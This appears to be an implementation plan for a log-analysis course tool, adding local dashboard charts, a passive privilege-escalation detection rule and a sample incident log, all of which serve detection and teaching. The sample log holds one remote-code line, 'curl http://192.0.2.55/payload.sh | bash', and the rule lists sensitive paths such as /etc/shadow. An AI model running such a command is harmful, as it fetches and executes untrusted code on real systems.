---
change: add-local-visualization-charts
design-doc: docs/superpowers/specs/2026-06-09-local-visualization-charts-design.md
base-ref: 3ca960d6385ff9857316212dd1db8f35df290a45
archived-with: 2026-06-09-add-local-visualization-charts
---

# Local Visualization Charts Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add local visual report charts, clearer passive privilege-escalation findings, and a richer bundled incident sample for the Logcheck course demo.

**Architecture:** Keep the existing Flask API shape and derive chart data in the static frontend from `/api/analyze`. Add passive behavior-rule coverage in `logcheck/rules.py`, a richer `samples/incident.log`, and tests that prove the UI remains local-only and responsive-ready.

**Tech Stack:** Python 3.11, Flask, pytest/unittest, plain HTML/CSS/JavaScript, no external chart library.

## File Map

- Modify `logcheck/rules.py`: add passive privilege-escalation behavior finding helper and wire it into `detect_findings`.
- Modify `tests/test_rules.py`: add tests for sudo, su, sensitive path, and admin/root path privilege-escalation findings.
- Create `samples/incident.log`: richer local demo fixture using documentation-range IP addresses.
- Modify `tests/test_analysis.py` or create `tests/test_samples.py`: verify the incident sample exercises brute-force, privilege-escalation, suspicious-command, source, and severity data.
- Modify `logcheck/web_static/index.html`: add the `Visual report` panel between summary and finding queue.
- Modify `logcheck/web_static/app.js`: add chart derivation/render helpers and reset behavior.
- Modify `logcheck/web_static/styles.css`: add responsive chart layout and bar styling.
- Modify `tests/test_webapp.py`: assert dashboard chart region, chart labels, local-only safety, and script hooks.
- Modify `docs/web-frontend-verification.md`: record chart, privilege-escalation, and incident-sample verification evidence.
- Modify `openspec/changes/add-local-visualization-charts/tasks.md`: check off completed implementation tasks.

### Task 1: Privilege-Escalation Rule Coverage

**Files:**
- Modify: `tests/test_rules.py`
- Modify: `logcheck/rules.py`

- [ ] **Step 1: Write failing privilege-escalation tests**

Add tests to `tests/test_rules.py` inside `RuleTests`:

```python
    def test_sudo_failure_creates_privilege_escalation_finding(self):
        event = Event(
            source_file="auth.log",
            line_number=1,
            raw_line="Jun  2 10:03:01 ubuntu sudo: pam_unix(sudo:auth): authentication failure; user=root",
            category="auth",
            actor="root",
            message="pam_unix(sudo:auth): authentication failure; user=root",
        )

        findings = detect_findings([event], default_config())

        privilege = [finding for finding in findings if finding.rule_id == "behavior.privilege_escalation"]
        self.assertEqual(len(privilege), 1)
        self.assertEqual(privilege[0].severity, "high")
        self.assertIn("Privilege escalation", privilege[0].explanation)
        self.assertEqual(privilege[0].line_number, 1)
        self.assertIsNotNone(privilege[0].severity_reason)
        self.assertIsNotNone(privilege[0].confidence_reason)

    def test_sensitive_path_creates_privilege_escalation_finding(self):
        event = Event(
            source_file="app.log",
            line_number=2,
            raw_line="2026-06-02 10:04:00 ERROR permission denied user=guest ip=198.51.100.7 path=/etc/shadow",
            category="application",
            actor="guest",
            source_address="198.51.100.7",
            message="permission denied user=guest ip=198.51.100.7 path=/etc/shadow",
        )

        findings = detect_findings([event], default_config())

        self.assertTrue(any(finding.rule_id == "behavior.privilege_escalation" for finding in findings))
```

- [ ] **Step 2: Run tests to verify they fail**

Run:

```bash
python -m pytest tests/test_rules.py -q
```

Expected: FAIL because `behavior.privilege_escalation` is not emitted yet.

- [ ] **Step 3: Add minimal passive rule helper**

In `logcheck/rules.py`, add a helper after `_suspicious_command_findings`:

```python
PRIVILEGE_ESCALATION_INDICATORS = (
    "sudo:auth",
    "sudo failure",
    "su:auth",
    "authentication failure; user=root",
    "/etc/shadow",
    "/root",
    "/admin",
)


def _privilege_escalation_findings(events: list[Event]) -> list[Finding]:
    findings: list[Finding] = []
    for event in events:
        text = _event_text(event)
        matched = next(
            (indicator for indicator in PRIVILEGE_ESCALATION_INDICATORS if indicator.lower() in text),
            None,
        )
        if matched is None:
            continue
        findings.append(
            Finding(
                rule_id="behavior.privilege_escalation",
                severity="high",
                explanation="Privilege escalation indicator observed in local log evidence.",
                evidence=[event.raw_line],
                source_file=event.source_file,
                line_number=event.line_number,
                timestamp=event.timestamp,
                source_address=event.source_address,
                actor=event.actor,
                target=event.target,
                matched_keyword=matched,
                severity_reason="Privilege escalation indicators are high priority for local review.",
                confidence_reason="Exact configured privilege-escalation indicator matched the event text.",
            )
        )
    return findings
```

Update `detect_findings`:

```python
def detect_findings(events: list[Event], config: DetectionConfig) -> list[Finding]:
    findings: list[Finding] = []
    findings.extend(_keyword_findings(events, config))
    findings.extend(_suspicious_command_findings(events, config))
    findings.extend(_privilege_escalation_findings(events))
    findings.extend(_brute_force_findings(events, config))
    findings.extend(_multi_signal_findings(findings))
    return findings
```

- [ ] **Step 4: Run rules tests**

Run:

```bash
python -m pytest tests/test_rules.py -q
```

Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add logcheck/rules.py tests/test_rules.py
git commit -m "feat: highlight privilege escalation indicators"
```

### Task 2: Rich Incident Sample

**Files:**
- Create: `samples/incident.log`
- Modify: `tests/test_analysis.py` or create `tests/test_samples.py`

- [ ] **Step 1: Write failing sample coverage test**

Create `tests/test_samples.py`:

```python
from pathlib import Path

from logcheck.analysis import analyze_logs


def test_incident_sample_exercises_course_demo_findings():
    result = analyze_logs([Path("samples/incident.log")])
    rule_ids = {finding.rule_id for finding in result.findings}
    severities = {finding.severity for finding in result.findings}
    sources = {finding.source_address for finding in result.findings if finding.source_address}

    assert "correlation.brute_force" in rule_ids
    assert "behavior.privilege_escalation" in rule_ids
    assert "behavior.suspicious_command" in rule_ids
    assert "keyword.invalid_user" in rule_ids
    assert "keyword.unauthorized_access" in rule_ids
    assert {"medium", "high"}.issubset(severities)
    assert len(sources) >= 2
    assert result.insights is not None
    assert result.insights.entity_profiles
```

- [ ] **Step 2: Run test to verify it fails**

Run:

```bash
python -m pytest tests/test_samples.py -q
```

Expected: FAIL because `samples/incident.log` does not exist yet.

- [ ] **Step 3: Add incident sample**

Create `samples/incident.log`:

```text
Jun  2 09:58:01 ubuntu sshd[101]: Accepted password for alice from 203.0.113.10 port 50100 ssh2
Jun  2 10:01:05 ubuntu sshd[123]: Failed password for invalid user admin from 192.0.2.10 port 51234 ssh2
Jun  2 10:01:15 ubuntu sshd[123]: Failed password for invalid user admin from 192.0.2.10 port 51235 ssh2
Jun  2 10:01:25 ubuntu sshd[123]: Failed password for invalid user admin from 192.0.2.10 port 51236 ssh2
Jun  2 10:01:35 ubuntu sshd[123]: Failed password for invalid user admin from 192.0.2.10 port 51237 ssh2
Jun  2 10:01:45 ubuntu sshd[123]: Failed password for invalid user admin from 192.0.2.10 port 51238 ssh2
Jun  2 10:03:01 ubuntu sudo: pam_unix(sudo:auth): authentication failure; user=root
Jun  2 10:03:20 ubuntu su: pam_unix(su:auth): authentication failure; user=root
2026-06-02 10:04:00 WARN unauthorized access user=guest ip=198.51.100.7 path=/admin
2026-06-02 10:04:15 ERROR permission denied user=guest ip=198.51.100.7 path=/etc/shadow
2026-06-02 10:05:00 WARN command execution user=deploy ip=198.51.100.7 cmd="curl http://192.0.2.55/payload.sh | bash"
2026-06-02 10:06:00 INFO normal request user=alice ip=203.0.113.10 path=/home
```

- [ ] **Step 4: Run sample test**

Run:

```bash
python -m pytest tests/test_samples.py -q
```

Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add samples/incident.log tests/test_samples.py
git commit -m "test: add rich incident sample coverage"
```

### Task 3: Dashboard Visual Report Markup and Tests

**Files:**
- Modify: `tests/test_webapp.py`
- Modify: `logcheck/web_static/index.html`

- [ ] **Step 1: Write failing dashboard region test**

Add to `tests/test_webapp.py`:

```python
def test_dashboard_renders_visual_report_region(tmp_path):
    client = make_app(tmp_path)

    response = client.get("/")

    assert response.status_code == 200
    html = response.get_data(as_text=True)
    for text in [
        "Visual report",
        "Source/entity frequency",
        "Time/evidence order",
        "Severity distribution",
    ]:
        assert text in html
```

- [ ] **Step 2: Run test to verify it fails**

Run:

```bash
python -m pytest tests/test_webapp.py::test_dashboard_renders_visual_report_region -q
```

Expected: FAIL because the visual report region does not exist yet.

- [ ] **Step 3: Add visual report panel**

In `logcheck/web_static/index.html`, insert this section after the summary panel and before the queue panel:

```html
          <section class="panel visual-report-panel" aria-labelledby="visual-report-title">
            <div class="panel-heading">
              <h2 id="visual-report-title">Visual report</h2>
              <span id="chart-count">0 charts</span>
            </div>
            <div class="chart-grid" id="chart-grid">
              <article class="chart-card" aria-labelledby="source-chart-title">
                <h3 id="source-chart-title">Source/entity frequency</h3>
                <div id="source-chart" class="chart-body">
                  <p class="empty-state">Run analysis to populate local charts.</p>
                </div>
              </article>
              <article class="chart-card" aria-labelledby="time-chart-title">
                <h3 id="time-chart-title">Time/evidence order</h3>
                <div id="time-chart" class="chart-body">
                  <p class="empty-state">Run analysis to populate local charts.</p>
                </div>
              </article>
              <article class="chart-card" aria-labelledby="severity-chart-title">
                <h3 id="severity-chart-title">Severity distribution</h3>
                <div id="severity-chart" class="chart-body">
                  <p class="empty-state">Run analysis to populate local charts.</p>
                </div>
              </article>
            </div>
          </section>
```

- [ ] **Step 4: Run dashboard test**

Run:

```bash
python -m pytest tests/test_webapp.py::test_dashboard_renders_visual_report_region -q
```

Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add logcheck/web_static/index.html tests/test_webapp.py
git commit -m "feat: add visual report dashboard region"
```

### Task 4: Frontend Chart Helpers and Rendering

**Files:**
- Modify: `tests/test_webapp.py`
- Modify: `logcheck/web_static/app.js`

- [ ] **Step 1: Write failing frontend hook test**

Add to `tests/test_webapp.py`:

```python
def test_dashboard_script_includes_local_chart_helpers():
    script = (PROJECT_ROOT / "logcheck" / "web_static" / "app.js").read_text(encoding="utf-8")

    for helper in [
        "renderCharts",
        "chartSourceDistribution",
        "chartTimeDistribution",
        "chartSeverityDistribution",
        "renderBarChart",
        "resetCharts",
    ]:
        assert helper in script
    assert "renderCharts(payload)" in script
    assert "resetCharts()" in script
```

- [ ] **Step 2: Run test to verify it fails**

Run:

```bash
python -m pytest tests/test_webapp.py::test_dashboard_script_includes_local_chart_helpers -q
```

Expected: FAIL because chart helpers are not implemented yet.

- [ ] **Step 3: Wire chart elements**

Near the existing DOM queries in `logcheck/web_static/app.js`, add:

```javascript
const chartCount = document.querySelector("#chart-count");
const charts = {
  source: document.querySelector("#source-chart"),
  time: document.querySelector("#time-chart"),
  severity: document.querySelector("#severity-chart"),
};
```

In `renderResult(payload)`, add after `renderInsights(payload.insights || []);`:

```javascript
  renderCharts(payload);
```

In `renderError(message)`, add before `toggleExports(false);`:

```javascript
  resetCharts();
```

- [ ] **Step 4: Add chart helper implementations**

Append before `escapeHtml(value)`:

```javascript
function renderCharts(payload) {
  const findings = payload.findings || [];
  const summary = payload.summary || {};
  const insights = payload.insights || {};
  const sourceRows = chartSourceDistribution(findings);
  const timeRows = chartTimeDistribution(findings, insights);
  const severityRows = chartSeverityDistribution(summary, findings);

  chartCount.textContent = findings.length ? "3 charts" : "0 charts";
  renderBarChart(charts.source, sourceRows, { empty: "No source/entity findings to chart." });
  renderBarChart(charts.time, timeRows, { empty: "No time or evidence-order data to chart." });
  renderBarChart(charts.severity, severityRows, { empty: "No severity findings to chart." });
}

function resetCharts() {
  chartCount.textContent = "0 charts";
  for (const container of Object.values(charts)) {
    container.innerHTML = '<p class="empty-state">Run analysis to populate local charts.</p>';
  }
}

function chartSourceDistribution(findings) {
  const counts = new Map();
  for (const finding of findings) {
    const label =
      finding.source_address || finding.actor || finding.source_file || "unknown";
    counts.set(label, (counts.get(label) || 0) + 1);
  }
  return sortedChartRows(counts).slice(0, 5);
}

function chartTimeDistribution(findings, insights) {
  const counts = new Map();
  const timeline = Array.isArray(insights.timeline) ? insights.timeline : [];
  findings.forEach((finding, index) => {
    const label =
      finding.timestamp ||
      (timeline[index] && timeline[index].label) ||
      `Evidence ${index + 1}`;
    counts.set(label, (counts.get(label) || 0) + 1);
  });
  return sortedChartRows(counts, false).slice(0, 6);
}

function chartSeverityDistribution(summary, findings) {
  const severityCounts = summary.findings_by_severity || {};
  const fallback = findings.reduce((counts, finding) => {
    const severity = String(finding.severity || "unknown").toLowerCase();
    counts[severity] = (counts[severity] || 0) + 1;
    return counts;
  }, {});
  const counts = Object.keys(severityCounts).length ? severityCounts : fallback;
  return ["critical", "high", "medium", "low"]
    .map((severity) => ({ label: severity, value: counts[severity] || 0 }))
    .filter((row) => row.value > 0);
}

function sortedChartRows(counts, byValue = true) {
  const rows = Array.from(counts, ([label, value]) => ({ label, value }));
  return rows.sort((left, right) => {
    if (byValue && right.value !== left.value) {
      return right.value - left.value;
    }
    return String(left.label).localeCompare(String(right.label));
  });
}

function renderBarChart(container, rows, options) {
  container.innerHTML = "";
  if (!rows.length) {
    container.innerHTML = `<p class="empty-state">${escapeHtml(options.empty)}</p>`;
    return;
  }
  const max = Math.max(...rows.map((row) => row.value), 1);
  for (const row of rows) {
    const item = document.createElement("div");
    item.className = "chart-row";
    item.title = `${row.label}: ${row.value}`;
    item.innerHTML = `
      <span class="chart-label">${escapeHtml(row.label)}</span>
      <span class="chart-track">
        <span class="chart-fill" style="width: ${(row.value / max) * 100}%"></span>
      </span>
      <span class="chart-value">${escapeHtml(String(row.value))}</span>
    `;
    container.append(item);
  }
}
```

- [ ] **Step 5: Run frontend hook and syntax checks**

Run:

```bash
python -m pytest tests/test_webapp.py::test_dashboard_script_includes_local_chart_helpers -q
node --check logcheck/web_static/app.js
```

Expected: both PASS.

- [ ] **Step 6: Commit**

```bash
git add logcheck/web_static/app.js tests/test_webapp.py
git commit -m "feat: render local chart summaries"
```

### Task 5: Chart Styling and Local-Only Regression

**Files:**
- Modify: `logcheck/web_static/styles.css`
- Modify: `tests/test_webapp.py`

- [ ] **Step 1: Strengthen local-only and style tests**

Update `test_dashboard_excludes_forbidden_remote_control_terms` only if new chart text needs no forbidden-term change. Add this test:

```python
def test_dashboard_styles_include_responsive_chart_rules():
    styles = (PROJECT_ROOT / "logcheck" / "web_static" / "styles.css").read_text(encoding="utf-8")

    for selector in [
        ".visual-report-panel",
        ".chart-grid",
        ".chart-card",
        ".chart-row",
        ".chart-fill",
    ]:
        assert selector in styles
    assert "grid-template-columns: repeat(3, minmax(0, 1fr))" in styles
```

- [ ] **Step 2: Run test to verify it fails**

Run:

```bash
python -m pytest tests/test_webapp.py::test_dashboard_styles_include_responsive_chart_rules -q
```

Expected: FAIL because chart styles are not present.

- [ ] **Step 3: Add chart styles**

Add to `logcheck/web_static/styles.css` near other panel/list styles:

```css
.visual-report-panel {
  overflow: hidden;
}

.chart-grid {
  display: grid;
  grid-template-columns: repeat(3, minmax(0, 1fr));
  gap: 1px;
  background: var(--line);
}

.chart-card {
  min-width: 0;
  background: var(--panel);
  padding: 12px;
}

.chart-card h3 {
  margin: 0 0 10px;
  font-size: 13px;
  line-height: 1.2;
}

.chart-body {
  display: grid;
  gap: 8px;
  min-height: 112px;
}

.chart-row {
  display: grid;
  grid-template-columns: minmax(74px, 1fr) minmax(90px, 2fr) 28px;
  align-items: center;
  gap: 8px;
  min-width: 0;
  font-size: 12px;
}

.chart-label {
  min-width: 0;
  overflow: hidden;
  color: var(--muted);
  font-weight: 700;
  text-overflow: ellipsis;
  white-space: nowrap;
}

.chart-track {
  position: relative;
  height: 9px;
  overflow: hidden;
  border-radius: 999px;
  background: var(--panel-soft);
}

.chart-fill {
  position: absolute;
  inset: 0 auto 0 0;
  min-width: 3px;
  border-radius: inherit;
  background: var(--accent);
}

.chart-value {
  color: var(--ink);
  font-weight: 800;
  text-align: right;
}
```

In the existing mobile media query, add:

```css
  .chart-grid {
    grid-template-columns: 1fr;
  }
```

- [ ] **Step 4: Run style and local-only tests**

Run:

```bash
python -m pytest tests/test_webapp.py::test_dashboard_styles_include_responsive_chart_rules tests/test_webapp.py::test_dashboard_excludes_forbidden_remote_control_terms tests/test_webapp.py::test_dashboard_script_fetches_only_local_api_inputs -q
```

Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add logcheck/web_static/styles.css tests/test_webapp.py
git commit -m "style: add responsive local chart layout"
```

### Task 6: Course Evidence and Final Verification

**Files:**
- Modify: `docs/web-frontend-verification.md`
- Modify: `openspec/changes/add-local-visualization-charts/tasks.md`

- [ ] **Step 1: Update verification notes**

Add to `docs/web-frontend-verification.md` under manual checks:

```markdown
- Visual report: verified source/entity, time/evidence-order, and severity charts after analyzing the bundled `incident.log` sample.
- Privilege-escalation evidence: verified findings for sudo/su failure and sensitive/admin path access remain passive and retain local source context.
- Incident sample: verified `samples/incident.log` covers benign baseline, brute-force, invalid-user, unauthorized-access, privilege-escalation, suspicious-command, and multiple source entities.
```

Add commands:

```markdown
- `python -m pytest tests/test_rules.py tests/test_samples.py tests/test_webapp.py tests/test_web_serialization.py -q`
- `node --check logcheck/web_static/app.js`
- `python -m pytest tests -q`
- `openspec validate add-local-visualization-charts --strict`
```

- [ ] **Step 2: Check off OpenSpec tasks**

Update `openspec/changes/add-local-visualization-charts/tasks.md` so each completed item uses `- [x]`.

- [ ] **Step 3: Run complete verification**

Run:

```bash
python -m pytest tests/test_rules.py tests/test_samples.py tests/test_webapp.py tests/test_web_serialization.py -q
node --check logcheck/web_static/app.js
python -m pytest tests -q
openspec validate add-local-visualization-charts --strict
```

Expected: all commands PASS.

- [ ] **Step 4: Commit**

```bash
git add docs/web-frontend-verification.md openspec/changes/add-local-visualization-charts/tasks.md
git commit -m "docs: record local visualization verification"
```

## Self-Review

Spec coverage:
- Local charts are covered by Tasks 3, 4, and 5.
- Privilege-escalation evidence is covered by Task 1.
- Rich incident sample is covered by Task 2.
- Safety and verification are covered by Tasks 5 and 6.

No placeholders are intentionally left in this plan. Commands and expected outcomes are specified for every task.
